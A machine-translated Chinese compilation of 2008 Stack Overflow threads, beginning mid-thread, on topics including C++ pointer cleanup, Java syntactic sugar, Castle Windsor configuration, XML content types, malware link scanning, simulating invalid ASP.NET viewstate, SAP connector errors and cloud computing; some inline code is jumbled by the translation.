我想以编程方式执行此操作的主要原因是能够自己记录哪个图像及其去向，因此我可以创建图像的动画效果，以创建照片马赛克。如果能找到一些已经存在的东西，我可以用它来完成这个几乎是开箱即用的，那就太好了。

有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T18:17:51.713

[拼接生成器](http://www.atalasoft.com/cs/blogs/31appsin31days/archive/2008/05/18/photomosaic-generator.aspx)

有可用的源代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T18:15:26.943

我认为您可以从颜色量化中借用一些想法。对于每张照片，计算它的平均颜色。由于它很小，这就是从远处看时的样子。然后将您的目标图像分割成照片大小的矩形并计算它们的平均颜色。或者，为了获得更好的效果，适当缩小它，使每张照片对应于目标图片中的一个像素。然后，针对目标图片的每个像素，选择颜色值最接近像素颜色的照片。（最接近 - 与 3D RGB 立方体中的最接近）。您还可以应用一些抖动以使其看起来更好（Floyd-Steinberg 的算法是目前最好的算法之一）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T23:30:40.020

您可以查找元像素，它具有用于进行照片马赛克分析的代码，但也可以记录一个输出文件，该文件准确列出每个位置使用的源图像。那应该做你需要的。虽然不确定Windows支持。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-19T18:09:19.513

不能真正回答您的问题，但您应该知道，Photomosaic 既有专利也有商标。您可以在您已经引用过的[维基百科文章](http://en.wikipedia.org/wiki/Photographic_mosaic)中找到信息。

# c++ - 检查 C++ 中的指针定义性

> ID：381718
> 
> 赞同：4
> 
> 时间：2008-12-19T18:05:05.060
> 
> 标签：c++, pointers

如何检查 C++ 中是否定义了变量，特别是指针？假设我有一堂课：

```
class MyClass {  
public:

    MyClass();

    ~MyClass() {
        delete pointer; // if defined!
    }

    initializePointer() {
        pointer = new OtherClass();
    }

private:

    OtherClass* pointer;

}; 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2008-12-19T18:14:56.540

为什么要担心检查指针值？只需将其初始化为空指针值，然后对其调用 delete 即可。空指针上的 delete 什么都不做（标准保证它）。

```
class MyClass {  
public:

    MyClass():pointer(0) { }

    ~MyClass() {
        delete pointer;
        pointer = 0;
    }

    initializePointer() {
        pointer = new OtherClass();
    }

private:

    OtherClass* pointer;

}; 
```

每次调用 delete 时，都应该将指针设置为空指针值。那么你们都很好。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-19T18:06:31.517

我倾向于在对象构造时将我的指针值初始化为 NULL。这允许检查 NULL 以查看是否定义了指针变量。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-19T18:12:21.693

除了检查`0`( `NULL`) 之外，一种解决方案是重构代码，以便*强制*指针始终有效。这并不总是可能的，但在大多数情况下，这是最好的解决方案。

在您的情况下（与大多数其他情况一样），这意味着在构造函数中初始化指针（即在其生命周期开始时）并在其生命周期结束时将其销毁。制作变量`private`并且不允许对其进行直接写访问，以确保它始终保持有效。

这是 C++ 中经常使用的模式，它有效地将指针对象的对象生命周期限制为类的生命周期。有时，提供某种`reset`删除指针并立即重新初始化它的方法也可能是一个可行的解决方案。如果这是以异常安全的方式编写的，您还可以确保您的指针永远不会无效。

不要创建ean 标志**来**`bool`跟踪指针的有效性。此解决方案将指针设置为 没有优点，也有许多缺点`0`。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-19T18:49:57.653

构造函数的全部意义在于，在它完成后，所有成员变量都被正确定义。在这种情况下，NULL 是一个有效的初始值。

在 NULL 上调用 delete 是明确定义的。

更常见的是，您希望构造函数定义 RAW 指针的值。此外，因为您的对象包含一个 RAW 指针并且显然拥有它（它正在删除它，这意味着所有权），您还必须确保覆盖编译器生成的 Copy Constructor 和 Assignment Operator 版本。

```
class MyClass
{  
    public:
        MyClass()
            :pointer(NULL)  // valid value.
        {}
        ~MyClass()
        {
            delete pointer; // This is fine.
        }

        void initializePointer() // Missing return type
        {
            pointer = new OtherClass();
        }

    private:
        MyClass(MyClass const& copy);           // If you don't define these 
        MyClass& operator=(MyClass const& copy);// two the compiler generated ones
                                                // will do nasty things with owned
                                                // RAW pointers.

        OtherClass* pointer;
}; 
```

或者，您可以使用标准智能指针之一。可能是 std::auto_ptr<> ，除非您真的想让对象可复制。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T18:07:26.727

您应该始终在构造函数中将指针初始化为 NULL；这样，您可以检查析构函数是否已初始化。此外，在构造函数的参数列表中这样做更有效，如下所示：

```
MyClass::MyClass() : pointer(NULL)
{
}

MyClass::~MyClass()
{
    if(pointer != NULL) { delete pointer; }
} 
```

同样，如果在程序的生命周期内要多次重新初始化对象，则在删除它时也应该将值设置为 NULL，并在分配它时检查值是否为 null。但是，在析构函数中将值设置为 NULL 不会有任何区别，因为对象显然无论如何都会被销毁。

这样做的好处（而不是在构造函数中显式地说“指针 = NULL；”）是编译器已经隐式地为你做这样的赋值。进行手动分配会使它发生两次，这通常没什么大不了的，除非您在一个大循环中创建了许多类实例或其他东西。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T18:08:07.833

你不能，我知道。标准方法是在它不包含有效值时将其设置为 NULL。在任何情况下，将该点周围的指针指向无效内存都是不好的做法。如果您坚持这一点，您可以随时检查 NULL 以查看它是否“已定义”。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T18:47:36.787

真正的[答案](https://stackoverflow.com/questions/381718/check-for-value-definedness-in-c#381749)是 litb 的答案，但我只是想发表一点评论。使用智能指针（在这种情况下 std::auto_ptr 就足够了）可以解决这个问题，并且您不需要记住在析构函数中删除指针。事实上，默认析构函数（由编译器生成）会处理内存资源。

使注释更加笼统，您的类应声明赋值运算符和复制构造函数，标记为私有（未定义）或手动定义以避免指针的双重删除。编译器提供的 operator== 和复制构造函数只会复制指针，最终您将进入双重删除。我在这里写这个是因为如果你使用 std::auto_ptr 并在 auto_ptr 中增加了复制语义的陌生性，这也是需要考虑的事情。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-19T18:49:17.513

另一个尚未提及的附加答案是使用智能指针对象而不是原始指针。根据随后使用指针的方式，此处可能适合使用 、 或许多其他智能指针类 `std::auto_ptr`。如果您稍微改变一下工作方式，也可能会起作用。`boost::shared_ptr``boost::scoped_ptr``initializePointer()`

这样，智能指针负责记住它是否有效，并在包含对象被销毁时删除自己：

```
class MyClass {  
public:

    MyClass();

    ~MyClass() {
    }

    initializePointer() {
        pointer.reset( new OtherClass());
    }

private:

    std::auto_ptr<OtherClass> pointer;

}; 
```

# java - 我想要在我的 Java 中有更多的语法糖！

> ID：381733
> 
> 赞同：8
> 
> 时间：2008-12-19T18:08:31.420
> 
> 标签：java, syntactic-sugar

例如在 C# 中属性的语法糖：

```
private int x;

public int X{
    get { return x; }
    set { x = value; }
} 
```

或者干脆

```
 public int X{ get; set; } 
```

我在 java 中缺少逐字字符串... @"C:\My Documents\" 而不是 "C:\\My Documents\\"

你同意 Java 需要更多的“糖”吗？任何人都知道下一个 Java 版本中会出现糖吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-12-19T18:37:40.643

“句法糖会导致分号癌。”

——艾伦·佩利斯。编程警句。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-12-19T18:23:31.000

听起来你想要[Groovy](http://groovy.codehaus.org/) ... 显然属性正在开发中，虽然不是在 Java 7 中（正如@erickson 在评论中帮助我纠正的那样）。

Groovy 确实有[很好的串糖](http://docs.codehaus.org/display/GroovyJSR/Groovy+String+Handling)。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2008-12-19T18:30:41.280

虽然我不一定同意 Java 的哲学，但我认为在 Java 中添加大量**语法糖**会违背其哲学。Java 应该是一种非常简单、易于推理且结构很少的语言，是编程社区中最低的*通用语言*。这主要是对 C++ 复杂性的一种反应。除了使其成为一种内存安全语言所需的（主要是垃圾收集）之外，它应该没有什么“魔法”。

如果您想要在相当高性能的静态类型语言中获得更多糖等，我会说 Java 对您来说是错误的语言。最好只使用 C#，或者 D.

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-12-19T18:43:59.100

在过去的几年中，我还使用 Java 和 C# 进行了开发，并发现 C# 在表达能力和强大的语言结构方面是一种优越的语言。Java 语言的变化和更新程度与 C# 不同，至少速度不同。我仍然不一定意味着 Java 应该大幅更新，但我们需要在 Java 平台上提供一种强大且富有表现力的静态类型语言。我认为 Scala 会发展成这种替代语言，我们 Java 开发人员可以在普通 Java 不削减它的情况下切换到它。

C# 是一门非常棒的语言；可能是当今“最好的”静态类型语言，但在我看来，Java 仍然是一个优越的平台。我喜欢 Java 这个平台，我喜欢 C# 这个语言。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-12-19T21:55:28.823

根据 Mark Reinhold 在 Devoxx 2008 上的演讲，Java 7 中不会向 Java 添加属性支持。

[http://hamletdarcy.blogspot.com/2008/12/java-7-update-from-mark-reinhold-at.html](http://hamletdarcy.blogspot.com/2008/12/java-7-update-from-mark-reinhold-at.html)

有关 Java 7 想法中的属性的更多信息：

[http://tech.puredanger.com/java7#property](http://tech.puredanger.com/java7#property)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-12-19T19:54:37.383

虽然属性很好，但它们不是 java。我真的认为 javabean 规范很久以前就关上了那扇门。我认为需要更清晰的语法糖案例：

*   由于缺少委托/闭包而使用内部类。当前的语法来自地狱。
*   方法作为一阶语言结构，即方法数据类型。
*   使用泛型进行类型推断
*   反射 API 中泛型的运行时存在。
*   活动

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-12-19T20:16:21.940

如果我再次将 java 用于任何大的东西，它将作为另一个编译器的输出语言。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-12-19T18:10:49.357

那是老式的 C#。如今是

```
public int X { get; set; } 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-12-19T18:16:48.110

糖对牙齿有害。语法糖对你的大脑有害。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-12-19T18:27:12.053

这不是完全必要的。

一个简单的编辑器宏可以工作：

道具 int x -->

```
private int x;

public int getX(){
   return x;
}
public void setX(int val){ 
   x = val;
} 
```

编辑：（回应评论）

这怎么比以下更具可读性：

```
private int x;

public int X{
    get { return x; }
    set { x = value; }
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-31T22:57:02.623

我已经写了一些注释（和一个注释处理器），这对这有很大帮助。

请参阅[http://code.google.com/p/javadude/wiki/Annotations](http://code.google.com/p/javadude/wiki/Annotations)

例如：

```
@Bean(
    properties={
        @Property(name="name", bound=true), // String is default type
        @Property(name="age", type=int.class, bound=true)
    }
)
public class Foo extends FooGen {} 
```

这会生成包含字段和 get/set 方法的 FooGen，并绑定它们（这是可选的）。你也可以用这些做很多其他有趣的事情。

注意：我现在正在做一些调整，以弃用各种“覆盖”选项。

享受，

——斯科特

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-12-19T18:49:12.617

Java 可以很好地实现的一件事是相当于**ref**和**out** 参数的东西。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-12-19T20:19:58.267

与许多人一样，我坚持管理用 Java 1.4 编写的应用程序（迁移到 1.5 是许多情况下的一种方式）。所以即使 Java 7 或 8 有了新的特性，我也将无法使用它们......无论如何语法糖是好的，它可以帮助编写、阅读和分析代码。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-12-19T20:28:39.607

我不喜欢“语法糖”，主要是因为这将是另一回事，而且很可能最终会被滥用。我已经诅咒自己制作 getter 和 setter 的烦恼，所以我理解为什么人们希望尽可能简单地创建它们，但我宁愿看到`@Get`,`@Set`和`@GetSet`注释而不是更多的语法 thingamajiggers 来完成这项工作。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-12-19T22:00:43.400

java平台采用了大量的编程语言。如果您想要更多的语法糖，您可以使用另一种语言，如 Groovy 或 (J)Ruby，它仍将在 jvm 上运行并与您的其他 java 库一起使用。（我什至认为有一个 C# 实现；）

# runtime - Castle Windsor：如何将运行时值指定为参数（例如从静态函数调用返回的值）

> ID：381734
> 
> 赞同：2
> 
> 时间：2008-12-19T18:09:07.487
> 
> 标签：runtime, castle-windsor, parameters

我想在城堡 xml 配置文件中执行此*代码等效项。*

// Foo(字符串名称)

IFoo f = new Foo(StaticBarClass.Name);

*XML*

现在对于 XML，我知道除了参数部分中的东西之外的所有内容（例如，等等）。

参数部分会是什么样子？

```
<component id="blah"
           service="blah"
           type="blah">
  <parameters>
    <name>StaticBarClas.Name_THAT_I_NEED_HELP_WITH</name>
  </parameters> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-21T11:00:45.527

您可以使用的一种方法是用您自己的变体替换配置参数检查器，这可以引入一些额外的行为 - 这是一个快速原型：

```
public class ExtendedConfigurationParametersInspector : IContributeComponentModelConstruction
{
  #region IContributeComponentModelConstruction Members

  public virtual void ProcessModel(IKernel kernel, ComponentModel model)
  {
    if (model.Configuration == null) return;

    IConfiguration parameters = model.Configuration.Children["parameters"];

    if (parameters == null) return;

    foreach (IConfiguration parameter in parameters.Children)
    {
      String name = parameter.Name;
      String value = parameter.Value;

      if (value == null && parameter.Children.Count != 0)
      {
        IConfiguration parameterValue = parameter.Children[0];
        model.Parameters.Add(name, parameterValue);
      }
      else
      {
        if (parameter.Attributes["type"] == "static")
        {
          int lastIndex = parameter.Value.LastIndexOf(".");
          string typeName = parameter.Value.Substring(0, lastIndex);
          string field = parameter.Value.Substring(lastIndex + 1);
          Type ownerType = Type.GetType(typeName);
          FieldInfo valueField = ownerType.GetField(field);
          value = (string) valueField.GetValue(null);
        }

        model.Parameters.Add(name, value);
      }
    }

    foreach (ParameterModel parameter in model.Parameters)
    {
      if (parameter.Value == null || !ReferenceExpressionUtil.IsReference(parameter.Value))
      {
        continue;
      }

      String newKey = ReferenceExpressionUtil.ExtractComponentKey(parameter.Value);

      model.Dependencies.Add(new DependencyModel(DependencyType.ServiceOverride, newKey, null, false));
    }
  }

  #endregion
}

public class ExtendedComponentBuilder : DefaultComponentModelBuilder
{
  public ExtendedComponentBuilder(IKernel kernel) : base(kernel)
  {
  }

  protected override void InitializeContributors()
  {
    AddContributor(new GenericInspector());
    AddContributor(new ConfigurationModelInspector());
    AddContributor(new ExtendedConfigurationParametersInspector());
    AddContributor(new LifestyleModelInspector());
    AddContributor(new ConstructorDependenciesModelInspector());
    AddContributor(new PropertiesDependenciesModelInspector());
    AddContributor(new LifecycleModelInspector());
    AddContributor(new InterceptorInspector());
    AddContributor(new ComponentActivatorInspector());
    AddContributor(new ComponentProxyInspector());
  }
}

public class ExtendedWindsorContainer : WindsorContainer
{
  public ExtendedWindsorContainer(IConfigurationInterpreter interpreter)
    : base(CreateKernel(), new Castle.Windsor.Installer.DefaultComponentInstaller())
  {
    if (interpreter == null) throw new ArgumentNullException("interpreter");

    interpreter.ProcessResource(interpreter.Source, Kernel.ConfigurationStore);

    RunInstaller();
  }

  private static IKernel CreateKernel()
  {
    DefaultKernel kernel = new DefaultKernel();
    kernel.ComponentModelBuilder = new ExtendedComponentBuilder(kernel);
    return kernel;
  }
} 
```

然后，您可以像这样连接容器中的属性，其中为参数指定“静态”类型将导致值被参数值引用的静态字段替换。

```
<castle>
  <components>
    <component id="test"
           type="SomeNamespace.TestComponent,Example">
      <parameters>
        <value type="static">SomeNamespace.SomeClass.TheStaticFieldValue</value>
      </parameters>
    </component>
  </components>
</castle> 
```

不幸的是，由于组件模型中的参数是不可变的，因此您通常无法通过更简单的方式（例如模型创建内核事件）来执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T19:20:11.307

您不能单独从 xml 进行设置。但是您可以使用[工厂设施](https://github.com/castleproject/Windsor/blob/master/docs/registering-components-one-by-one.md#using-a-delegate-as-component-factory)来执行此操作。

# xml - 无论如何在 XML 文档中更改 XML 文档的内容类型？

> ID：381744
> 
> 赞同：0
> 
> 时间：2008-12-19T18:12:10.023
> 
> 标签：xml, http-headers, xmlhttprequest, content-type

无论如何在 XML 文档中更改 XML 文档的内容类型？

我正在使用一个非常旧的系统来传回 HTML（我们正试图让它返回 XML）。我从 XMLHttpRequest 中检索它，并且我注意到使用 netcat 它没有传回任何内容类型的标头。

当我收到 XMLHttpRequest.responseXML 时，responseText 存在但 responseXML 为空。

我已经检查了返回的 XML 以查看它是否格式正确并且看起来是正确的（这是一个非常短的文档）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T18:19:17.763

不，`Content-Type`正如您所指的那样（在您问题的评论中）是 HTTP 标头的一部分。

HTTP 只是（比如说）XML 文档*的传输方式。*它们是有效负载，它们对 HTTP 标头一无所知，因此无法更改它们。

您可能的意思是“`<meta http-equiv="...`在 XML 中是否有等价物。不，没有。即使 HTML 也无法更改 HTTP 标头，它只能使用户代理的行为有所不同。如果将 HTML 文件保存到磁盘，并且在加载时，用户代理没有可用的标头。

`<?xml version="1.0" encoding="UTF-8"?>`在 XML 中，所有必要的信息都在文件顶部的处理指令 ( ) 中。无需标题信息即可正确加载/显示它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T18:36:38.867

不。

当 UA 可以访问任何这样的标签时，它已经必须决定它正在解析什么样的文档。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T19:52:27.620

我想通了，这是获取 xhr.responseText 字符串并从中创建 XML 文档的问题：

```
function createDOMFromString(sXml){

    var browser = navigator.appName;
    var oXmlDom = null;

    // IE Implementation...
    if(browser == "Microsoft Internet Explorer") {
         oXmlDom=new ActiveXObject("Microsoft.XMLDOM");
         oXmlDom.async="false";
         oXmlDom.loadXML(sXml);
    }
    // FF Implementation...
    else {
        var oParser = new DOMParser();
        oXmlDom = oParser.parseFromString(sXml, "text/xml");
    }
    // TODO: If we need it Safari implementation.

    return oXmlDom;
} 
```

干杯!

# malware - 程序化链接扫描

> ID：381747
> 
> 赞同：2
> 
> 时间：2008-12-19T18:13:12.253
> 
> 标签：malware

我正在寻找一种程序化链接扫描解决方案。有很多家用软件包可以扫描搜索结果页面上的 url 并验证这些网站上没有恶意软件，但我正在寻找一种可以以编程方式执行此操作的软件。我希望能够为代码提供一个 url，让它执行远程请求并扫描网页以查找恶意软件。
有没有人遇到过类似的事情？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T20:48:50.847

[谷歌安全浏览](http://code.google.com/apis/safebrowsing/)

> " ..是一个实验性 API，它使客户端应用程序能够根据 Google 不断更新的可疑网络钓鱼和恶意软件页面黑名单检查 URL。您的客户端应用程序可以使用该 API 下载加密表，以便在本地客户端查找 URL喜欢检查。”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T18:26:53.987

Google 搜索执行此任务。流行的浏览器也已经根据黑名单检查可疑网站。是否有令人信服的理由让您认为自己可以做得更好？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T18:30:38.160

好吧，我的网站接受用户输入，然后通过电子邮件向我们的客户发送一些信息。我们希望能够在转发恶意软件并可能感染我们的客户之前检查这些链接是否存在恶意软件。老实说，我更愿意为此使用预先存在的软件。我只知道我需要在 Code 中执行此操作，而不是依赖独立的软件，因为它需要自动化。理想情况下，我们希望在提交表单时检查链接......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-10T13:31:13.150

以下是相关资源列表：http: [//www.malwarehelp.org/freeware-open-source-commercial-website-security-tools-services-downloads.html](http://www.malwarehelp.org/freeware-open-source-commercial-website-security-tools-services-downloads.html)

# asp.net - 模拟无效视图状态的简单方法？

> ID：381758
> 
> 赞同：1
> 
> 时间：2008-12-19T18:18:18.513
> 
> 标签：asp.net, viewstate

有没有一种*简单*的方法来模拟无效的 Viewstate？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T18:19:31.943

当然：只需在页面中添加一个简单的 javascript 函数来修改隐藏的 __VIEWSTATE 输入。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T18:20:44.530

你也可以使用[提琴手](http://www.fiddlertool.com/fiddler/)

它可以很容易地模拟回发，您可以修改该帖子。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-22T20:39:11.393

这是实现 Joel 建议的 jQuery 方法：

```
<script language="javascript">
$(document).ready(function() {
    jQuery('input[@name=__VIEWSTATE]').val("this is now bad");
}); 
```

# interface - SAP .NET 连接器：编组 .NET 类型时引发系统异常

> ID：381760
> 
> 赞同：3
> 
> 时间：2008-12-19T18:18:51.320
> 
> 标签：interface, marshalling, sap, saprfc, sap-dotnet-connector

我的应用程序向 SAP 发送了大量数据。为此，它构建了一个 SAP 表对象并将其发送过来。我经常收到此错误，但不可靠：

```
System exception thrown while marshaling .NET type 20081219 to RFCTYPE_BCD
   at SAP.Connector.Rfc.RfcMarshal.NetFieldToRfcField(Object src, RFCTYPE type, Encoding encoding, Byte[] dest, Int32 offset, Int32 len, Int32 charSize, Int32 decimals)
   at SAP.Connector.Rfc.RfcStructureUtil.ToRfcStructure(Object obj, Byte[] dest, Type t, Encoding encoding, Boolean isUnicode, PropertyInfo[] propinfos, RfcStructInfo structInfo)
   at SAP.Connector.Rfc.RfcStructureUtil.GetITabFromList(SAPConnection conn, Object list, Type t, RfcStructInfo structInfo, Int32 itab)
   at SAP.Connector.Rfc.RfcClient.PrepareClientParameters(Type classType, MethodInfo m, Boolean isTQRfc, Object[] MethodParamsIn, RFC_PARAMETER[]& paramsIn, RFC_PARAMETER[]& paramsOut, RFC_TABLE[]& tables, ParameterMap[]& paramMaps)
   at SAP.Connector.Rfc.RfcClient.RfcInvoke(SAPClient proxy, String method, Object[] methodParamsIn)
   at SAP.Connector.SAPClient.SAPInvoke(String method, Object[] methodParamsIn) 
```

奇怪的是，这种情况并非每次都发生。此外，它抱怨的 .NET 类型“20081219”是我传递的*数据（日期）——不是类型。*我认为该字段的类型是`RFCTYPE.RFCTYPE_TIME`.

有关如何解决此间歇性错误的任何建议？在对 SAP RFC 的调用之间我应该清除某种状态吗？

* * *

**更新：**

根据要求，这是调用 SAP 的代码：

```
Using sapConnection As New MySapProxy(ConnectionString)
  sapConnection.Connection.Open()
  sapConnection.TheSapRfcICall(SapOpCode, Nothing, Nothing, sapTable, ResultTable)
End Using 
```

我在想也许多个线程正在以某种方式使用相同的连接。相反，使用`SAP.Connector.GetNewConnection`并没有改变任何东西。

* * *

**更新：**

即使我运行单个线程，似乎也会出现这个问题！这是怎么回事？？

有没有办法禁用连接池以查看是否可以修复它？

* * *

**更新：**

@Igal Serban 的回答似乎对我有用。明天早上我会检查日志并（希望）奖励赏金！非常感谢。

* * *

**更新：**

根据要求，我的 librfc32.dll 版本是 6403.3.78.4732。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T21:21:28.020

**更新 4：**再想一想，我认为 librfc 版本并不重要。异常似乎来自托管代码。我能想到的选项是：

*   尝试在单线程版本上使用调试器。
*   神奇的方式。即使没有找到错误（那是在 sap 或您的代码上）。只要改变你做生意的方式就可以让它消失。它丑陋，但有时很实用。无论如何，您的场景推荐的方法似乎是使用连接池，而不是为每个请求创建新的代理对象。所以可以使用这样的（未经测试的）代码：

* * *

```
MySapProxy proxy = new MySapProxy(); // do this only once.

// and in you main loop:
using (proxy.Connection = Connection.GetConnection(connectionString))
{
    proxy.TheSapRfcICall(SapOpCode, Nothing, Nothing, sapTable, ResultTable)
} 
```

* * *

此示例隐式使用连接池。可以从配置文件中控制使用。

**更新 3：**您能检查一下您的 librfc32.dll 版本和日期吗？它应该在 system32 目录或您的应用程序目录或您的 %path% 的某个位置。

**更新 2：** Sap 笔记就像 kb 文章。我不知道是否可以免费访问 sdn.sap.com 中的注释，所以我已将其发送到您的邮箱。

**更新 1：** SAP Note 1000057 指出：

> 在多线程重负载下，可能会出现引用 System.Xml.Xsl.XsltException 作为内部异常的 RfcMarshalException 类型的异常。

虽然不完全是您收到的异常。这值得一试。

补丁作为本说明的附件提供。

**更新0：**只是猜测。但我建议查看线程问题。这是所有的堆栈吗？您可以在调用 sap 代码的代码中发布部分吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-06T04:38:04.593

**编辑**：

我仍然认为这与映射有关。我相信 RFCTYPE_BCD 类型是十进制的（Business Connector Decimal），因此很难将日期值推入其中（有时可能会起作用？）。我建议重新生成代理，或在收到错误时记录正在编组的数据。像这样的东西（抱歉 - 我们使用自己的代理层，所以我对 Business Connector 不太熟悉）：

您能否将以下内容翻译成 VB（以及任何 sapTable 结构的格式）：

```
Using sapConnection As New MySapProxy(ConnectionString)
  sapConnection.Connection.Open()
  try {
    sapConnection.TheSapRfcICall(SapOpCode, Nothing, Nothing, sapTable, ResultTable)
  } catch (Exception e) {
    StringBuilder sb = new StringBuilder();
    foreach (Field f in sapTable.Fields) {
      sb.AppendLine(f.Name + "=" f.Value);
    }
    sb.AppendLine(e.StackTrace);
    File.AppendAllText("C:\\Exception_" + DateTime.Now.ToString("u") + ".txt", sb.ToString());
  }
End Using 
```

我知道这很痛苦，但只要在错误发生时快速而肮脏地获取一些数据以吐出。

========

仅从您发布的描述来看，我能想到的最好的可能是您正在尝试将日期值 (20081219) 编组到时间字段中？

您可以将该调用包装在 try/catch 中并记录发送到 SAP 的表的值并在此处发布吗？我希望数据中有线索。

通过向 SAP 发布 Web 服务，我知道 SAP 非常注重其日期时间和值的格式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-06T04:43:16.140

~~看起来它正在尝试将整数或字符串（由于 ToString() 无法分辨）转换为[BCD](http://en.wikipedia.org/wiki/Binary-coded_decimal)（二进制编码的十进制）类型。~~

~~只是一个猜测，希望对你有帮助。~~

更新：

可能不会。

多个线程使用同一个连接？这可能不是一个好主意，除非您使用锁定，这将使线程毫无意义。我确定 SAP 支持连接池，所以在它自己的线程中打开连接（每个线程一个）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-06T18:21:46.593

可能是日期格式问题？你说它不会每次都发生。
因此，当您通过 20081202 时，它将“12”作为日部分，将 02 作为月部分。没关系。
但是，当您通过 20081219 时，它会尝试将 19 解析为一个月并抛出异常？
请咨询您的 SAP 管理员。

# cloud - 云计算真的来了吗？

> ID：381761
> 
> 赞同：3
> 
> 时间：2008-12-19T18:19:10.180
> 
> 标签：cloud

我经常听到这个词。我有一堆小问题想问。

*   企业真的准备好迎接云计算了吗？
*   消费者是否有适当的资源来使用来自云的服务？
*   这项技术是否容易受到更多攻击？
*   一些人认为云计算只是另一个被过度炒作的术语，它将会失败。真的？
*   作为开发人员，我需要做什么不同的事情？

我真的很期待回复。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T18:25:17.157

人们现在认为的云计算，尤其是亚马逊/谷歌/微软的产品，实际上只是抽象传统托管的炫目方式。只是当你说“云”时，人们会认为将通常保存在内部的数据放到网上是可以的。

真正的云计算还意味着您的应用程序也分布在主机的数据中心中，这样，在国家另一端甚至大洋彼岸的用户都可以由最近的节点提供服务（由他们的 isp 使用的任何路由机制定义）无需您做额外的工作，如果一个节点出现故障，还有其他几个节点在处理该应用程序。

您现在可以这样做，但您必须自己设置它 - 没有任何服务会自动“将您的网站/服务放入云中”，就像您只是使用 Rackspace 托管一个网站一样。

目前最接近的东西是 SaleForce 平台。使用该系统，您不必担心实例、内存或数据库大小或活动。您只是构建您的应用程序，而销售人员担心使其扩展。如果您的应用程序运行良好并且人们知道它，那么您将拥有付费客户，并且无论他们身在何处，销售人员都会为他们提供数据。用户必须订阅 salesforce 的事实只是一个商业模式问题，与所涉及的技术无关。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-12-19T18:25:29.683

我认为在 70 年代后期它被称为[分时](https://en.wikipedia.org/wiki/Time-sharing):)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-02-11T02:55:12.173

我为 Salesforce.com 工作，我们也有一个名为 Force.com 的“云计算”平台，旨在以数据为中心的业务应用程序。但我认为总的来说，你不能太沉迷于术语。真正的趋势是人们将网络作为一种应用程序部署模型（即软件即服务）——这已经持续了一段时间，但我们看到的是人们也在寻找更进步的参与者在那个领域（比如谷歌和我们）给他们的不仅仅是硬件。他们正在寻找这些参与者来帮助他们更快地构建应用程序，方法是依靠一堆构建块和服务来卸载更多的低级内容并使开发人员能够专注于他们应用程序的重要部分。只是我的两分钱。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T18:35:06.577

1）他们已经使用它多年了，所以我想是的。

2）他们有网络浏览器，所以是的。

3) 哦，是的，我的兄弟们。

4) 这个词的流行，它的使用就像它具有某种“Web 2.0”和“软件即服务”所没有的宇宙意义，肯定是过头了，会失败，而且真的不可能发生很快。

5）假设你一直在做的是使用你能找到的最好的方法来完成你需要完成的事情，什么都没有。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T18:40:06.380

根据我对云计算（目前几乎没有）的理解，我认为“云”和我们很多人已经做事的方式之间没有太大的区别——我们从服务中请求数据提供商，该提供商向我们提供的信息可能存储在互联网上的不同资源中，或者可能托管在他们自己的服务器上，我们不在乎。我们所关心的只是我们请求数据，然后他们将其提供给我们......就像谷歌搜索一样，除了他们的设计和开发团队之外，谁真正知道谷歌闭门造车的背后发生了什么。

不过，这种云概念有一些有用的应用，SO 和 Gravitar 之间的关系以及您的头像的 OpenID 和登录到 StackOverflow。互联网上不同的资源一起发挥作用，形成一个有凝聚力的产品。

您还可以使用 iPhone 订阅存储机制（对于我们这些拥有 iPhone 的人）——它允许您的所有数据和文件存放在互联网上的某个地方，当您需要访问它时，您的 iPhone 会告诉 Apple你想要你的文件并且奇迹般地该文件出现在你的 iPhone 上。

